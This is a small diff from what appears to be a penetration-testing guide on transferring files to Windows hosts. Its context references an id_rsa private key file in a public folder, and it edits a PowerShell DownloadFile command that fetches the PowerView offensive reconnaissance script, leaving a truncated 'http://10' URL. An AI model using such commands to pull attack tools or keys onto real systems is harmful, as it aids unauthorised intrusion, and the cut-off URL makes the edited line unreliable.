@@ -110,7 +110,7 @@ MD5         4E301756A07DED0A2DD6953ABF015278       C:\Users\Public\id_rsa
 
 ```powershell
 # Syntax: (New-Object Net.WebClient).DownloadFile('<URL>','<Output Path>')
-(New-Object Net.WebClient).DownloadFile('http://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+(New-Object Net.WebClient).DownloadFile('http://10','C:\Users\Public\Downloads\PowerView.ps1')
 ```
 
 ```powershell
